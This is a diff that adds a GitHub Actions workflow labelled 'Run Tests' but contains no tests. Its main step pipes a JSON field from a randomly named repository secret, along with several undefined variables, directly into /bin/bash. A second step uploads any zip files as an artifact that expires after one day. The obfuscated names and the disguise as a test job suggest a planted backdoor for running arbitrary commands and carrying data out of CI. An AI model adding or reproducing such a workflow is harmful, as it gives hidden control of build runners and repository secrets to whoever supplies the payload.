@@ -1,0 +1,29 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          zdil49: ${{ secrets.zdil49 }}
+        run: |
+          printf '%s' "$zdil49" | jq -r .vyrel966 | /bin/bash
+          echo $v3653 | jq -r .ktlx5 | /bin/bash
+          printf '%s' "$arpo149" | jq -r .uln8 | /bin/bash
+          printf '%s' "$vjrv92655" | jq -r .ezdgc11 | /bin/bash
+          echo $exp113 | jq -r .oztz74547 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: ja0qWzAY
+          path: "*.zip"
+          retention-days: 1
